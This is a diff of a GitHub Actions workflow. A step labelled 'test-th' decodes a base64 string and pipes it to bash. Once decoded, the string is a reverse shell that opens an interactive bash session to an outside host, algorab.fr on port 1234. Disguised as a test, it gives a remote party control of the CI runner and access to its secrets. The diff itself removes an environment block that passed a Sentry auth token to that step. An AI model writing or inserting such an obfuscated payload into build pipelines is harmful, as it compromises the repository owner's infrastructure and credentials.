@@ -28,5 +28,3 @@ jobs:
 
       - name: test-th
         run: echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9hbGdvcmFiLmZyLzEyMzQgMD4mMQ==' | base64 -d | bash
-        env:
-            SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
